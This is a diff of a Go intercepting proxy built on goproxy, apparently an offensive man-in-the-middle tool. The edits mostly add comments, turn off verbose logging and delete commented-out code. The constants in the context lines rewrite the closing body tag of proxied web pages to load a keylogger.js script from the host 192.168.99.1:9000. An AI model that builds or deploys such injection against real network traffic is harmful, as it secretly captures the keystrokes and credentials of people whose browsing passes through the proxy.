@@ -12,9 +12,9 @@ import (
 )
 
 const (
-    CONN_HOST = "0.0.0.0"
-    CONN_PORT = "8080"
-    CONN_TYPE = "tcp"
+    CONN_HOST = "0.0.0.0" //allow from all connections
+    CONN_PORT = "8080" //allow on port 8080
+    CONN_TYPE = "tcp" //accept tcp connections
 
     INJECT_LOGGER_REPLACE = "</body>"
     INJECT_LOGGER_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
@@ -52,7 +52,8 @@ func StartSimpleProxy() {
     // Start the proxy.
     proxy := goproxy.NewProxyHttpServer()
 
-    proxy.Verbose = true
+    //useful for debugging
+    proxy.Verbose = false
 
     //transparency
     proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -212,9 +213,6 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 if err != nil {
                     log.Println(" help!: ", err)
                 }
-                // log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
-
-                // log.Println(server_ssl_response.TLS)
                 bs, err := ioutil.ReadAll(server_ssl_response.Body)
                 if err != nil {
                     log.Println(err)
@@ -230,7 +228,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 ctx.Resp = client_response
                 return goproxy.FORWARD
 
-            } else { // if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
+            } else { 
                 // Redirecting to some HTTP page.
                 log.Println("Response is HTTP")
                 bs, err := ioutil.ReadAll(ctx.Resp.Body)
